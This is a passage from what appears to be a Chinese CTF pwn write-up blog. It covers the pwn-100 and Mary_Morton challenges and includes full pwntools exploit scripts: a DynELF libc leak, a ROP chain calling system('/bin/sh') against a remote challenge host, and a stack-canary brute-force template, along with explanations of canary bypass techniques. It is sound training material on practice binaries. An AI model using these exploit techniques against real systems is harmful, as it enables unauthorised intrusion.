class="hljs-number">135</span>&#x27;)<br><br>p.recvuntil(<span class="hljs-string">&quot;exit<span class="hljs-subst">\n</span>&quot;</span>)<br>p.send(<span class="hljs-string">&quot;3&quot;</span>+<span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;change:<span class="hljs-subst">\n</span>&quot;</span>)<br>p.send(<span class="hljs-string">&quot;137&quot;</span>+<span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;number:<span class="hljs-subst">\n</span>&quot;</span>)<br>p.sendline(&#x27;<span class="hljs-number">137</span>&#x27;)<br><br>p.recvuntil(<span class="hljs-string">&quot;exit<span class="hljs-subst">\n</span>&quot;</span>)<br>p.send(<span class="hljs-string">&quot;3<span class="hljs-subst">\n</span>&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;change:<span class="hljs-subst">\n</span>&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;138&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;number:<span class="hljs-subst">\n</span>&quot;</span>)<br>p.sendline(&#x27;<span class="hljs-number">4</span>&#x27;)<br><br>p.recvuntil(<span class="hljs-string">&quot;exit<span class="hljs-subst">\n</span>&quot;</span>)<br>p.send(<span class="hljs-string">&quot;3<span class="hljs-subst">\n</span>&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;change:<span class="hljs-subst">\n</span>&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;139&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;number:<span class="hljs-subst">\n</span>&quot;</span>)<br>p.sendline(&#x27;<span class="hljs-number">8</span>&#x27;)<br>&#x27;&#x27;&#x27;<br>#<span class="hljs-number">0x08048987</span><br><span class="hljs-number">08048980</span>  <span class="hljs-number">2</span>F <span class="hljs-number">62</span> <span class="hljs-number">69</span> <span class="hljs-number">6</span>E <span class="hljs-number">2</span>F <span class="hljs-number">62</span> <span class="hljs-number">61</span> <span class="hljs-number">73</span>  <span class="hljs-number">68</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">2</span>A <span class="hljs-number">2</span>A <span class="hljs-number">2</span>A <span class="hljs-number">2</span>A  /bin/bash...****<br>&#x27;&#x27;&#x27;<br>p.recvuntil(<span class="hljs-string">&quot;exit<span class="hljs-subst">\n</span>&quot;</span>)<br>#gdb.<span class="hljs-section">attach</span>(p,<span class="hljs-string">&quot;b *0x80488ee&quot;</span>)<br>p.send(<span class="hljs-string">&quot;5<span class="hljs-subst">\n</span>&quot;</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>



<h2 id="pwn-100"><a href="#pwn-100" class="headerlink" title="pwn-100"></a>pwn-100</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br>   <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>   <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>   <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>   <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br></code></pre></td></tr></table></figure>

<p>➤ ROPgadget –binary pwn-100  –only ‘pop|ret’ | grep ‘rdi’<br>0x0000000000400763 : pop rdi ; ret</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sub_40068E</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> v1; <span class="hljs-comment">// [rsp+0h] [rbp-40h]</span><br><br>  <span class="hljs-built_in">sub_40063D</span>((__int64)&amp;v1, <span class="hljs-number">200</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;bye~&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function">int64 __fastcall <span class="hljs-title">sub_40063D</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> a2)</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )<br>  &#123;<br>    result = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)i;<br>    <span class="hljs-keyword">if</span> ( i &gt;= a2 )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, (<span class="hljs-keyword">void</span> *)(i + a1), <span class="hljs-number">1uLL</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="puts"><a href="#puts" class="headerlink" title="puts"></a>puts</h4><p>puts()函数用来向标准输出设备（屏幕）输出字符串并换行，具体为：把字符串输出到标准输出设备，将’\0’转换为回车换行。其调用方式为，puts(s)；其中s为字符串字符（字符串数组名或字符串指针）。 puts输出字符串时要遇到’\0’也就是字符结束符才停止 。</p>
<p>int puts(const char *string);</p>
<p>puts()函数的一种实现方案如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">puts</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> * string)</span>　</span><br><span class="hljs-function"></span>&#123;　<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> * t = string;　<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> * v = string;　<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;　<br>    <span class="hljs-keyword">while</span>(*t!=<span class="hljs-string">&#x27;\0&#x27;</span>)　<br>    &#123;　<br>        i++;　<br>        t++;　<br>    &#125;　<br>    <span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>;　<br>    <span class="hljs-keyword">for</span>(j;j&lt;=i;j++)　<br>        <span class="hljs-built_in">putchar</span>((v[j]));　<br>    <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;\n&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;　<br>&#125;<br></code></pre></td></tr></table></figure>



<h4 id="write"><a href="#write" class="headerlink" title="write"></a>write</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> count)</span></span>;<br></code></pre></td></tr></table></figure>

<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">write</span>() writes up <span class="hljs-built_in">to</span> count <span class="hljs-keyword">bytes</span> <span class="hljs-built_in">from</span> <span class="hljs-keyword">the</span> buffer starting <span class="hljs-keyword">at</span> buf <span class="hljs-built_in">to</span><br><span class="hljs-keyword">the</span> <span class="hljs-built_in">file</span> referred <span class="hljs-built_in">to</span> <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">file</span> descriptor fd.<br></code></pre></td></tr></table></figure>

<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-keyword">On</span> success, the number <span class="hljs-keyword">of</span> bytes written <span class="hljs-built_in">is</span> returned.  <span class="hljs-keyword">On</span> <span class="hljs-keyword">error</span>, -<span class="hljs-number">1</span> <span class="hljs-built_in">is</span><br>returned, <span class="hljs-built_in">and</span> errno <span class="hljs-built_in">is</span> <span class="hljs-keyword">set</span> <span class="hljs-keyword">to</span> indicate the cause <span class="hljs-keyword">of</span> the <span class="hljs-keyword">error</span>.<br></code></pre></td></tr></table></figure>

<p>此题较基础，需要注意的点就是x64函数的传参，</p>
<p>linux下常见的就是gcc编译环境，传参方式如：void function( rdi, rsi, rdx, rcx, r8, r9 ,…(on stack))</p>
<p>另外知道write,puts,gets,read等函数的特点有助于解题</p>
<p>思路：</p>
<p>靠 DynELF 模块泄露libc基址，在rw段写入”/bin/sh”,然后system(“/bin/sh”)。</p>
<p>这里贴上 Tangerine 的exp</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-meta">#!/usr/bin/python</span><br><span class="hljs-meta">#coding:utf-8</span><br>from pwn import *<br>io = remote(<span class="hljs-string">&quot;111.198.29.45&quot;</span>, <span class="hljs-number">40321</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwn100&quot;</span>)<br>puts_addr = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>start_addr = <span class="hljs-number">0x400550</span><br>pop_rdi = <span class="hljs-number">0x400763</span><br>pop6_addr = <span class="hljs-number">0x40075a</span>   		<span class="hljs-meta">#万能gadget1：pop rbx<span class="hljs-comment">; pop rbp; pop r12; pop r13; pop r14; pop r15; retn</span></span><br>mov_call_addr = <span class="hljs-number">0x400740</span>	<span class="hljs-meta">#万能gadget2：mov rdx, r13<span class="hljs-comment">; mov rsi, r14; mov edi, r15d; call qword ptr [r12+rbx*8]</span></span><br><br>binsh_addr = <span class="hljs-number">0x60107c</span>		<span class="hljs-meta">#bss放了STDIN和STDOUT的FILE结构体，修改会导致程序崩溃，所以找了个固定的可写地址</span><br><br><br><br>def leak(addr):<br>	count = <span class="hljs-number">0</span><br>	up = <span class="hljs-string">&#x27;&#x27;</span><br>	content = <span class="hljs-string">&#x27;&#x27;</span><br>	payload = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">72</span>				<span class="hljs-meta">#padding</span><br>	payload += p64(pop_rdi)			<span class="hljs-meta">#给puts()赋值</span><br>	payload += p64(addr)			<span class="hljs-meta">#leak函数的参数addr</span><br>	payload += p64(puts_addr)		<span class="hljs-meta">#调用puts()函数</span><br>	payload += p64(start_addr)		<span class="hljs-meta">#跳转到start，恢复栈</span><br>	payload = payload.ljust(<span class="hljs-number">200</span>, <span class="hljs-string">&#x27;B&#x27;</span>)	<span class="hljs-meta">#padding</span><br>	io.<span class="hljs-built_in">send</span>(payload)<br>	io.recvuntil(<span class="hljs-string">&quot;bye~\n&quot;</span>)<br>	<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:								<span class="hljs-meta">#无限循环读取，防止recv()读取输出不全</span><br>		c = io.recv(numb=<span class="hljs-number">1</span>, timeout=<span class="hljs-number">0.1</span>)	<span class="hljs-meta">#每次读取一个字节，设置超时时间确保没有遗漏</span><br>		count += <span class="hljs-number">1</span>							<br>		<span class="hljs-keyword">if</span> up == <span class="hljs-string">&#x27;\n&#x27;</span> <span class="hljs-literal">and</span> c == <span class="hljs-string">&quot;&quot;</span>: 			<span class="hljs-meta">#上一个字符是回车且读不到其他字符，说明读完了</span><br>			content = content[:<span class="hljs-number">-1</span>]+<span class="hljs-string">&#x27;\x00&#x27;</span>	<span class="hljs-meta">#最后一个字符置为\x00</span><br>			<span class="hljs-built_in">break</span><br>		<span class="hljs-keyword">else</span>:<br>			content += c	<span class="hljs-meta">#拼接输出</span><br>			up = c	<span class="hljs-meta">#保存最后一个字符</span><br>	content = content[:<span class="hljs-number">4</span>]	<span class="hljs-meta">#截取输出的一段作为返回值，提供给DynELF处理</span><br>	<span class="hljs-built_in">log</span>.info(<span class="hljs-string">&quot;%#x =&gt; %s&quot;</span> % (addr, (content <span class="hljs-literal">or</span> <span class="hljs-string">&#x27;&#x27;</span>).encode(<span class="hljs-string">&#x27;hex&#x27;</span>)))<br>	<span class="hljs-keyword">return</span> content<br><br>d = DynELF(leak, elf = elf)<br>system_addr = d.lookup(<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;libc&#x27;</span>)<br><span class="hljs-built_in">log</span>.info(<span class="hljs-string">&quot;system_addr = %#x&quot;</span>, system_addr)<br>payload = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">72</span>			<span class="hljs-meta">#padding</span><br>payload += p64(pop6_addr)	<span class="hljs-meta">#万能gadget1</span><br>payload += p64(<span class="hljs-number">0</span>)			<span class="hljs-meta">#rbx = 0</span><br>payload += p64(<span class="hljs-number">1</span>)			<span class="hljs-meta">#rbp = 1，过掉后面万能gadget2的call返回后的判断</span><br>payload += p64(read_got)	<span class="hljs-meta">#r12 = got表中read函数项，里面是read函数的真正地址，直接通过万能gadget2的call qword ptr [r12+rbx*8]调用</span><br>payload += p64(<span class="hljs-number">8</span>)			<span class="hljs-meta">#r13 = 8，read函数读取的字节数，万能gadget2赋值给rdx</span><br>payload += p64(binsh_addr)	<span class="hljs-meta">#r14 = read函数读取/bin/sh保存的地址，万能gadget2赋值给rsi</span><br>payload += p64(<span class="hljs-number">0</span>)			<span class="hljs-meta">#r15 = 0，read函数的参数fd，即STDIN，万能gadget2赋值给edi</span><br>payload += p64(mov_call_addr)	<span class="hljs-meta">#万能gadget2</span><br>payload += <span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">56</span>		<span class="hljs-meta">#万能gadget2后接判断语句，过掉之后是万能gadget1，用于填充栈</span><br>payload += p64(start_addr)	<span class="hljs-meta">#跳转到start，恢复栈</span><br><span class="hljs-meta">#payload = payload.ljust(200, <span class="hljs-string">&quot;B&quot;</span>)	#padding</span><br>io.<span class="hljs-built_in">send</span>(payload)<br>io.recvuntil(<span class="hljs-string">&#x27;bye~\n&#x27;</span>)<br>io.<span class="hljs-built_in">send</span>(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<span class="hljs-meta">#上面的一段payload调用了read函数读取<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>，这里发送字符串</span><br><br>payload = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">72</span>				<span class="hljs-meta">#padding</span><br>payload += p64(pop_rdi)			<span class="hljs-meta">#给system函数传参</span><br>payload += p64(binsh_addr)		<span class="hljs-meta">#rdi = &amp;(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)</span><br>payload += p64(system_addr)		<span class="hljs-meta">#调用system函数执行system(<span class="hljs-string">&quot;/bin/sh&quot;</span>)</span><br>payload = payload.ljust(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;B&quot;</span>)	<span class="hljs-meta">#padding</span><br>io.<span class="hljs-built_in">send</span>(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="Mary-Morton"><a href="#Mary-Morton" class="headerlink" title="Mary_Morton"></a>Mary_Morton</h2><p>这道题涉及到了canary</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br>  <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>  <span class="hljs-attr">Stack:</span>    <span class="hljs-string">Canary</span> <span class="hljs-string">found</span><br>  <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>  <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br></code></pre></td></tr></table></figure>

<p>提供了system</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-number">000004008</span>DA <span class="hljs-comment">; __unwind &#123;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004008</span>DA                 <span class="hljs-keyword">push</span>    rbp<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004008</span>DB                 <span class="hljs-keyword">mov</span>     rbp, rsp<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004008</span>DE                 <span class="hljs-keyword">mov</span>     edi, offset command <span class="hljs-comment">; &quot;/bin/cat ./flag&quot;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004008E3</span>                 <span class="hljs-keyword">call</span>    _system<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004008E8</span>                 <span class="hljs-keyword">nop</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004008E9</span>                 <span class="hljs-keyword">pop</span>     rbp<br></code></pre></td></tr></table></figure>

<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sub_4009DA</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. Stack Bufferoverflow Bug &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. Format String Bug &quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3. Exit the battle &quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> __int64 <span class="hljs-title">sub_4008EB</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+0h] [rbp-90h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+88h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">memset</span>(&amp;buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>uLL);<br>  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x7F</span>uLL);<br>  <span class="hljs-built_in">printf</span>(&amp;buf, &amp;buf);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> __int64 <span class="hljs-title">sub_4008EB</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+0h] [rbp-90h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+88h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u); <span class="hljs-comment">//canary</span><br>  <span class="hljs-built_in">memset</span>(&amp;buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>uLL);<br>  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x7F</span>uLL);<br>  <span class="hljs-built_in">printf</span>(&amp;buf, &amp;buf);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v2;  <span class="hljs-comment">//canary</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>先了解一波CANARY，原文： <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/c3624f5dd583">https://www.jianshu.com/p/c3624f5dd583</a> </p>
<p>Canary保护机制的原理，是在一个函数入口处从fs段内获取一个随机值，一般存到EBP - 0x4(32位)或RBP - 0x8(64位)的位置。如果攻击者利用栈溢出修改到了这个值，导致该值与存入的值不一致，__stack_chk_fail函数将抛出异常并退出程序。Canary最高字节一般是\x00，防止由于其他漏洞产生的Canary泄露</p>
<blockquote>
<p> <code>需要注意的是：canary一般最高位是\x00，64位程序的canary大小是8个字节，32位的是4个字节，canary的位置不一定就是与ebp存储的位置相邻，具体得看程序的汇编操作</code></p>
</blockquote>
<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><h3 id="泄漏canary："><a href="#泄漏canary：" class="headerlink" title="泄漏canary："></a>泄漏canary：</h3><p>这个操作大概分两种：</p>
<ul>
<li>1.先通过覆盖Canary最后一个”\x00″字节，来防止0截断，进而通过printf等函数打印出4/8位的Canary，又或者通过格式化字符串泄漏输出canary，之后，计算好偏移，将Canary填入到相应的溢出位置，实现为所欲为的栈溢出</li>
<li>SSP leak，这个是反向思维的操作，通过Canary的报错输出来泄露内存,如下面源代码所示。libcargv[0]应用程序的参数，在Canary出错报错输出中会打印出应用程序的路径，这正是__libc_argv[0]的内容，如果栈溢出到能够覆盖__libc_argv[0]，那么Canary就会报错打印相应的指针内容</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&quot;debug/fortify_fail.c&quot;</span><br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">__attribute__</span> <span class="hljs-params">((noreturn)</span>)</span><br><span class="hljs-function"><span class="hljs-title">__fortify_fail</span> <span class="hljs-params">(msg)</span></span><br><span class="hljs-function"> <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *msg</span>;<br>&#123;<br> <span class="hljs-comment">/* The loop is added only to keep gcc happy. */</span><br> <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br> __libc_message (<span class="hljs-number">2</span>, <span class="hljs-string">&quot;*** %s ***: %s terminated\n&quot;</span>,<br> msg, __libc_argv[<span class="hljs-number">0</span>] ?: <span class="hljs-string">&quot;&lt;unknown&gt;&quot;</span>);<br>&#125;<br>libc_hidden_def (__fortify_fail)<br></code></pre></td></tr></table></figure>

<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><h3 id="修改canary"><a href="#修改canary" class="headerlink" title="修改canary"></a>修改canary</h3><p>由于多线程中Canary存入TLS结构体，而TLS位于多线程内部栈的高地址，并且该结构体与当前栈差距不足一个page，导致我们能对其进行修改，改为我们想要的值，从而绕过检测。</p>
<p>这种操作一般在多线程下进行，而且溢出的字节必须足够大才能溢出到tls的位置从而修改canary<br> 题目详见：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/110f715c210f%E4%B8%AD%E7%9A%84babystack">https://www.jianshu.com/p/110f715c210f中的babystack</a></p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><h3 id="爆破canary"><a href="#爆破canary" class="headerlink" title="爆破canary"></a>爆破canary</h3><p>Canary在设计中存在一个缺陷，这个缺陷或许不是由于Canary的设计问题，而是linux的机制导致的，那就是子进程会继承父进程的Canary，每一次fork的进程内存布局与父进程一致，Canary值也相同</p>
<p>这样当我们子进程由于Canary判断不正确导致程序crash后，父进程不会Crash<br> 我们就完全可以利用这样的特点，彻底逐个字节将Canary爆破出来，爆破模板如下</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] Brute forcing stack canary &quot;</span><br><br>start = <span class="hljs-built_in">len</span>(p)<br>stop = <span class="hljs-built_in">len</span>(p)+<span class="hljs-number">8</span><br><br>while <span class="hljs-built_in">len</span>(p) &lt; stop:<br>   <span class="hljs-keyword">for</span> i in xrange(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>):<br>      res = send2server(p + chr(i))<br><br>      <span class="hljs-keyword">if</span> res != <span class="hljs-string">&quot;&quot;</span>:<br>         p = p + chr(i)<br>         #<span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\t[+] Byte found 0x%02x&quot;</span> % i<br>         <span class="hljs-keyword">break</span><br><br>      <span class="hljs-keyword">if</span> i == <span class="hljs-number">255</span>:<br>         <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[-] Exploit failed&quot;</span><br>         sys.exit(<span class="hljs-number">-1</span>)<br><br><br>canary = p[stop:start<span class="hljs-number">-1</span>:<span class="hljs-number">-1</span>].encode(<span class="hljs-string">&quot;hex&quot;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;   [+] SSP value is 0x%s&quot;</span> % canary<br></code></pre></td></tr></table></figure>

<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><h3 id="绕过canary"><a href="#绕过canary" class="headerlink" title="绕过canary"></a>绕过canary</h3><p>这种操作的核心思想就是想办法让他不执行canary的报错或者直接跳过canary的检查</p>
<ul>
<li>1.利用格式化字符串或者数组下标越界，可以栈地址任意读写，不必连续向栈上写，直接写ebp和ret因此不会触发Canary检查。</li>
